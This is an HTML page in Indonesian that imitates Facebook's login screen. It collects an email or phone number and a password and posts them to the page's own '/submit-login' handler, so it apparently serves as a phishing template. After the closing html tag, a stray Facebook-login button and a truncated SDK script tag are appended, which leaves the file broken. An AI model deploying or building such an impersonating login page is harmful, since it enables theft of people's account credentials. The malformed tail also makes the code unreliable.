<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h2>Facebook</h2>
            <form action="/submit-login" method="POST">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email atau Nomor Telepon" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Kata Sandi" required>
                </div>
                <div class="input-group">
                    <button type="submit">Masuk</button>
                </div>
                <div class="forgot-password">
                    <a href="#">Lupa Kata Sandi?</a>
                </div>
            </form>
            <div class="signup">
                <p>Belum punya akun? <a href="#">Daftar</a></p>
            </div>
        </div>
    </div>
</body>
</html>
<button onclick="checkLoginState()">Login with Facebook</button>
<script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></scr
